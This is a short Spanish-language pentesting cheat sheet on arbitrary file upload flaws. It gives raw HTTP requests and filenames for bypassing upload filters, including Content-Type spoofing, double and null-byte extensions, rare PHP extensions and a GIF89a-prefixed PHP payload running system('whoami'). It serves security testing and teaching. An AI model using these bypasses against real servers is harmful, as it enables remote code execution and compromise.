# Arbitrary File Upload

Vulnerabilidad de carga de archivos arbitrarios que permite a un atacante cargar archivos maliciosos en un servidor. 

Se puede encontrar en funciones de carga de archivos, por ejemplo, en la carga de perfil de fotos

# Explotando

1 - Modificar el valor del Content-Type 

Respuesta del servidor:

    POST /images/upload/ HTTP/1.1
    Host: target.com
    ...
    Content-Disposition: form-data; name="uploaded"; filename="vuln.php"
    Content-Type: application/x-php
    
Nosotros deberíamos modificarlo asi:

    POST /images/upload/ HTTP/1.1
    Host: target.com
    ...
    Content-Disposition: form-data; name="uploaded"; filename="vuln.php"
    Content-Type: image/jpeg
    
2 - Intente cambiar la extensión cuando envíe la solicitud, por ejemplo, en éste caso no se puede cargar un archivo php, pero puede cargar un archivo jpg

Respuesta del servidor:

    POST /images/upload/ HTTP/1.1
    Host: target.com
    ...
    Content-Disposition: form-data; name="uploaded"; filename="vuln.php"
    Content-Type: application/x-php

Manipulando la respuesta agregando la extensión jpg al final:

    POST /images/upload/ HTTP/1.1
    Host: target.com
    ...
    Content-Disposition: form-data; name="uploaded"; filename="vuln.php.jpg"
    Content-Type: application/x-php
    
3 - Cargue la carga útil, pero comience con GIF89a; 

    POST /images/upload/ HTTP/1.1
    Host: target.com
    ...
    Content-Disposition: form-data; name="uploaded"; filename="vuln.php"
    Content-Type: image/gif

    GIF89a; <?php system("whoami") ?>
    
Y no olvide cambiar el Content-Type a imagen/gif     

4 - Usando un null byte en el nombre del archivo

    file.php%00.gif
    
5 - Subir extensiones php impopulares (php4,php5,php6,phtml)

    file.php5
    
6 - Intente poner en mayúsculas aleatoriamente la extensión del archivo

    file.pHP5
